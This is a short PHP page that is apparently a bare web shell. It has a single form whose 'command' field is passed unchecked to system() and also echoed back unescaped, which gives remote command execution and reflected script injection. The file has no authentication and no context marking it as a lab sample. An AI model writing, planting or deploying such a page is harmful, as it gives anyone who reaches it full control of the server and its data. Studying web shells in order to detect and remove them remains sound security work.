<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" href="styles.css">
</head>
<body>

<form method="post">
    <p><input type="text" name="command" /></p>
    <input type="submit" name="run" value="RUN" />
</form>
<?php
if (isset($_POST['run'])) {
    echo ("Command: " . $_POST['command'] . "<br/>");
    system($_POST['command']);
}
?>
</body>
</html> 